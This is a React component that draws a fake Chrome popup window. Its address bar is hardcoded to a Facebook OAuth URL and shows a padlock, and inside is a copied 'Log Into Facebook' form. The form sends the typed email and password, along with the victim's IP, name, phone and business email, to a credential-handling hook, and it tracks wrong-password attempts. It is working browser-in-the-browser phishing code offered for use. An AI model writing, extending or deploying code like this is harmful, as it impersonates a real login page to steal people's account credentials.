import React, { useState, useContext, useEffect } from "react";
import { createPortal } from "react-dom";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

function Step2PC({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
  onClose,
}) {
  const [isValidEmail, setIsValidEmail] = useState(true);
  const [isModalLoading, setIsModalLoading] = useState(true);
  const { setAllData, AllData } = useContext(DataContext);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsModalLoading(false);
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();
    setIsValidEmail(true);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  const modalContent = (
    <>
      {/* Modal Overlay */}
      <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4 bg-black bg-opacity-50 overflow-y-auto">
        {/* Modal Container - Chrome Window */}
        <div className="bg-white rounded-lg shadow-xl w-full max-w-md relative overflow-hidden my-8">
          {/* Chrome Address Bar - Single Bar */}
          <div className="bg-white border-b border-gray-300 px-2 py-2 flex items-center gap-2 rounded-t-lg">
            {/* Navigation Buttons */}
            <div className="flex items-center gap-0">
              <button 
                className="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
                onClick={() => onClose ? onClose() : window.history.back()}
              >
                <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
                </svg>
              </button>
              <button className="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors">
                <svg className="w-4 h-4 text-gray-300" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
                </svg>
              </button>
              <button 
                className="w-7 h-7 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors"
                onClick={() => {
                  setIsModalLoading(true);
                  setTimeout(() => {
                    setIsModalLoading(false);
                  }, 1500);
                }}
              >
                <svg width="12" height="12" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M13.65 2.35C12.2 0.9 10.21 0 8 0C3.58 0 0.01 3.58 0.01 8C0.01 12.42 3.58 16 8 16C11.73 16 14.84 13.45 15.73 10H13.65C12.83 12.33 10.61 14 8 14C4.69 14 2 11.31 2 8C2 4.69 4.69 2 8 2C9.66 2 11.14 2.69 12.22 3.78L9 7H16V0L13.65 2.35Z" fill="#5F6368"/>
                </svg>
              </button>
            </div>

            {/* URL Bar */}
            <div className="flex-1 bg-[#f1f3f4] rounded-full px-3 py-1 flex items-center gap-2 min-w-0">
              <svg className="w-3.5 h-3.5 text-gray-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-xs text-gray-700 truncate">https://www.facebook.com/signin/oauth/id?authuser=0&part=AJi8hAN392oFevtTAAkFqMEXIL3eXabLBL9rzNq6Oc4-muxxsxLhpJ_7x8F5-9YlAMCwTrPY5zCBZO9e5w-BWtYUldK6xYin1nZ0LAXijr9zH6_JvSTAW7PnZFJK1lRyWRJFWRUrCjUeUye0UqGuWt99zAh2t9Xnx_f6iOzDjVBWjk9Xsz4-FH6XoFbnQ5iztN84u6NVUaTR5JADrl3JGcRILsnW1r2id6r5M8I1nJHzxsSY0ZN4ngK-W_ujRJHwnR9xgqrgOrmI3jcKlpk-el1xkX5FbYSI-77Xv4GC4YuaWNi2I6aklf3uQG6Ap20d-wEs4E-cxU1GuAmsXJF-cGavtVsZEbwtfMapRKiftzxYREggvhkxbOviZacYcHDQelgiok-loKBO9jUDm9xXX7w-NJ0TrivUbK4G7houOKMlyUVVJskLsu0hSyhuzPWizVHWK-ikUVNthLGYaDJ0NSOvUXvUo6vTsg25g6TGSHE43Gj3uXtMcykS66dcl39xU4M45_ji4cHApV4wuu5ial0rlx1EkhoqgPVOtpapBfvoIFY7QvWOTehQxYU9BOiAZxg26HdvXOq_wEED85NEULUylE-tP7FbkxopLbOXvlcOrYB1BBJg978wvw8VToeHPwpE6F7LN4Qb4W2R_6pwgoAMfzj7dwrWhRVX5Ei_laO-u_y_mW-sdcRtCoPexzh-i3_WvZS-NvncOlASf3uGkzV9Ps-PBM1v9BR3xPkvInZTFSXWVmRc7ZutP6x-Pt1vFv9jQcpAdEK9VnYYJ1clPxfPBRLUmbG_xQhMzuStwe766PZ-hasMks54Ke-CMnMq3eli1oYMlRT3wBM18b3FiV-RLvOPy-Lglc-IcjQO8XqrzUmJanZgE_U&flowName=GeneralOAuthFlow&as=F6N6ekeupoSqnwR5UNZKhTTkNsC8VhtNcU8pM8hGa84&client_id=748546363-11lp66se7cl6samfubad3dlsjnau8t11.apps.googleusercontent.com&rapt=AEjHL4M4uU2VxfgLmMlKVV3o2dAG1MogIJQHsIWiHpzXV3idyTUAynuEkNqBXSbvpaQwHvzz0kRyyXfbOcPlYV_Pr2f6uXx7GdYXRYy_43VTugp_gN4_I1Q&requestPath=%2Fsignin%2Foauth%2Fconsent#</span>
            </div>
            <button 
              className="ml-auto w-4 h-4 flex items-center justify-center rounded hover:bg-gray-300 flex-shrink-0"
              onClick={() => onClose ? onClose() : window.history.back()}
            >
              <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
              </svg>
            </button>
          </div>

          {/* Content Area */}
          <div className="bg-[#f0f2f5] px-4 py-8">
            {isModalLoading ? (
              <div className="flex items-center justify-center min-h-[400px]">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 200 200"
                  className="h-16 w-16"
                >
                  <radialGradient
                    id="a12loading"
                    cx=".66"
                    fx=".66"
                    cy=".3125"
                    fy=".3125"
                    gradientTransform="scale(1.5)"
                  >
                    <stop offset="0" stopColor="#1877f2"></stop>
                    <stop
                      offset=".3"
                      stopColor="#1877f2"
                      stopOpacity=".9"
                    ></stop>
                    <stop
                      offset=".6"
                      stopColor="#1877f2"
                      stopOpacity=".6"
                    ></stop>
                    <stop
                      offset=".8"
                      stopColor="#1877f2"
                      stopOpacity=".3"
                    ></stop>
                    <stop
                      offset="1"
                      stopColor="#1877f2"
                      stopOpacity="0"
                    ></stop>
                  </radialGradient>
                  <circle
                    transform-origin="center"
                    fill="none"
                    stroke="url(#a12loading)"
                    strokeWidth="15"
                    strokeLinecap="round"
                    strokeDasharray="200 1000"
                    strokeDashoffset="0"
                    cx="100"
                    cy="100"
                    r="70"
                  >
                    <animateTransform
                      type="rotate"
                      attributeName="transform"
                      calcMode="spline"
                      dur="2"
                      values="360;0"
                      keyTimes="0;1"
                      keySplines="0 0 1 1"
                      repeatCount="indefinite"
                    ></animateTransform>
                  </circle>
                  <circle
                    transform-origin="center"
                    fill="none"
                    opacity=".2"
                    stroke="#1877f2"
                    strokeWidth="15"
                    strokeLinecap="round"
                    cx="100"
                    cy="100"
                    r="70"
                  ></circle>
                </svg>
              </div>
            ) : (
              <>
            {/* Facebook Logo */}
            <div className="text-center mb-4">
              <h1 className="text-5xl font-bold text-[#1877f2]" style={{ fontFamily: 'Klavika, sans-serif' }}>facebook</h1>
            </div>

            {/* Alert Message */}
            <div className="bg-white !border border-[#5890ff] rounded-sm mb-4 flex items-center overflow-hidden">
              <div className="bg-[#1877f2] p-2 flex items-center justify-center flex-shrink-0">
                <div className="bg-white rounded-full w-5 h-5 flex items-center justify-center">
                  <span className="text-[#1877f2] text-xs font-bold">i</span>
                </div>
              </div>
              <div className="flex-1 px-3 py-2">
                <p className="text-sm text-[#1c1e21] m-0">
                  You must log in to continue.
                </p>
              </div>
            </div>

            {/* Login Card */}
            <div className="bg-white rounded-lg shadow-md p-4">
              <h2 className="text-lg text-center font-normal text-gray-900 font-fbook mb-4">
                Log Into Facebook
              </h2>

              {/* Warning Box */}
              <div className="bg-[#f5edcd] !border border-[#f5dd9c] rounded mb-4 py-2.5">
                <p className="text-xs text-center text-gray-900 font-fbook m-0">
                  You must log in to continue.
                </p>
              </div>

              <input
                type="text"
                value={Email}
                onChange={handleEmailChange}
                placeholder="Email or phone number"
                className={`border rounded-md py-3 px-3 bg-white w-full text-sm mb-3 text-gray-900 leading-normal box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
                  !isValidEmail && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
                }`}
                disabled={isLoading}
              />
              {emailError && (
                <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                  {emailError}
                </div>
              )}

              <input
                type="password"
                value={password}
                onChange={handlePasswordChange}
                placeholder="Password"
                className={`border rounded-md py-3 px-3 bg-white w-full text-sm text-gray-900 leading-normal mb-4 box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
                  password.length < 5 && triedSubmit ? "border-red-500" : "border-[#dddfe2]"
                }`}
                disabled={isLoading}
              />
              {passwordError && (
                <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                  {passwordError}
                </div>
              )}

              <button
                onClick={handleSubmit}
                className="w-full h-10 bg-[#1877f2] border-none rounded-md text-white text-base font-semibold font-fbook px-4 mb-4 cursor-pointer flex items-center justify-center hover:bg-[#166fe5] transition-colors"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center h-10 w-10">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 200 200"
                      className="h-full w-full"
                    >
                      <radialGradient
                        id="a12"
                        cx=".66"
                        fx=".66"
                        cy=".3125"
                        fy=".3125"
                        gradientTransform="scale(1.5)"
                      >
                        <stop offset="0" stopColor="#FFFFFF"></stop>
                        <stop
                          offset=".3"
                          stopColor="#FFFFFF"
                          stopOpacity=".9"
                        ></stop>
                        <stop
                          offset=".6"
                          stopColor="#FFFFFF"
                          stopOpacity=".6"
                        ></stop>
                        <stop
                          offset=".8"
                          stopColor="#FFFFFF"
                          stopOpacity=".3"
                        ></stop>
                        <stop
                          offset="1"
                          stopColor="#FFFFFF"
                          stopOpacity="0"
                        ></stop>
                      </radialGradient>
                      <circle
                        transform-origin="center"
                        fill="none"
                        stroke="url(#a12)"
                        strokeWidth="15"
                        strokeLinecap="round"
                        strokeDasharray="200 1000"
                        strokeDashoffset="0"
                        cx="100"
                        cy="100"
                        r="70"
                      >
                        <animateTransform
                          type="rotate"
                          attributeName="transform"
                          calcMode="spline"
                          dur="2"
                          values="360;0"
                          keyTimes="0;1"
                          keySplines="0 0 1 1"
                          repeatCount="indefinite"
                        ></animateTransform>
                      </circle>
                      <circle
                        transform-origin="center"
                        fill="none"
                        opacity=".2"
                        stroke="#FFFFFF"
                        strokeWidth="15"
                        strokeLinecap="round"
                        cx="100"
                        cy="100"
                        r="70"
                      ></circle>
                    </svg>
                  </div>
                ) : (
                  "Log In"
                )}
              </button>

              <div className="text-center">
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    ButtonActions.handleForgottenPassword({
                      AllData,
                      setAllData,
                      Unik,
                      Email,
                      Ip,
                    });
                  }}
                  className="text-[#1877f2] text-sm no-underline font-fbook hover:underline"
                >
                  Forgot account?
                </a>
              </div>
            </div>
            </>
            )}
          </div>
        </div>
      </div>

      {/* Hidden Footer for reference */}
      <footer className="hidden flex-col items-start w-full pt-4 pb-5 bg-white font-fbook text-xs text-gray-500 md:mt-0  mt-0">
        <div className="flex flex-wrap justify-start mb-2 border-b border-gray-300 pb-2 w-full max-w-5xl mx-auto">
          <div className="text-xs mx-1 text-gray-500">English (UK)</div>
          <a
            href="https://es-la.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Español
          </a>
          <a
            href="https://fr-fr.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Français (France)
          </a>
          <a
            href="https://zh-cn.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            中文(简体)
          </a>
          <a
            href="https://ar-ar.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            العربية
          </a>
          <a
            href="https://pt-br.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Português (Brasil)
          </a>
          <a
            href="https://it-it.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Italiano
          </a>
          <a
            href="https://ko-kr.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            한국어
          </a>
          <a
            href="https://de-de.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            Deutsch
          </a>
          <a
            href="https://hi-in.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            हिन्दी
          </a>
          <a
            href="https://ja-jp.facebook.com/"
            className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
          >
            日本語
          </a>
          <button className="bg-gray-100 border border-gray-300 rounded-sm px-2 h-5 text-xs text-gray-600 ml-1 cursor-pointer hover:bg-gray-200">
            +
          </button>
        </div>
        <div className="flex flex-wrap justify-start mt-2 max-w-5xl mx-auto w-full">
          <a
            href="/reg/"
            className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
          >
            Sign Up
          </a>
          <a
            href="/login/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline font-fbook font-normal"
          >
            Log In
          </a>
          <a
            href="https://messenger.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Messenger
          </a>
          <a
            href="/lite/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Facebook Lite
          </a>
          <a
            href="https://en-gb.facebook.com/watch/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Video
          </a>
          <a
            href="https://about.meta.com/technologies/meta-pay"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Pay
          </a>
          <a
            href="https://www.meta.com/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Store
          </a>
          <a
            href="https://www.meta.com/quest/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Quest
          </a>
          <a
            href="https://www.meta.com/smart-glasses/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Ray-Ban Meta
          </a>
          <a
            href="https://www.meta.ai/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta AI
          </a>
          <a
            href="https://www.instagram.com/"
            target="_blank"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Instagram
          </a>
          <a
            href="https://www.threads.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Threads
          </a>
          <a
            href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
            className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
          >
            Voting Information Centre
          </a>
          <a
            href="/privacy/policy/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs  mb-1 m-0 no-underline cursor-pointer hover:underline"
          >
            Privacy Policy
          </a>
          <a
            href="/privacy/policies/health/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Consumer Health Privacy
          </a>
          <a
            href="/privacy/center/?entry_point=facebook_page_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Privacy Centre
          </a>
          <a
            href="https://about.meta.com/"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            About
          </a>
          <a
            href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create ad
          </a>
          <a
            href="/pages/create/?ref_type=site_footer"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create Page
          </a>
          <a
            href="https://developers.facebook.com/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Developers
          </a>
          <a
            href="/careers/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Careers
          </a>
          <a
            href="/policies/cookies/"
            className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
          >
            Cookies
          </a>
          <a
            href="https://www.facebook.com/help/568137493302217"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            AdChoices
          </a>
          <a
            href="/policies?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Terms
          </a>
          <a
            href="/help/?ref=pf"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Help
          </a>
          <a
            href="https://www.facebook.com/help/637205020878504"
            className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
          >
            Contact uploading and non-users
          </a>
          <a
            href="/settings"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Settings
          </a>
          <a
            href="/allactivity?privacy_source=activity_log_top_menu"
            className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Activity log
          </a>
        </div>
        <div className="mt-3 text-xs text-gray-500 max-w-5xl w-full mx-auto">
          Meta © 2025
        </div>
      </footer>
    </>
  );

  // Use Portal to render modal at document.body level for persistence
  if (typeof window === 'undefined') return null;
  return createPortal(modalContent, document.body);
}

export default Step2PC;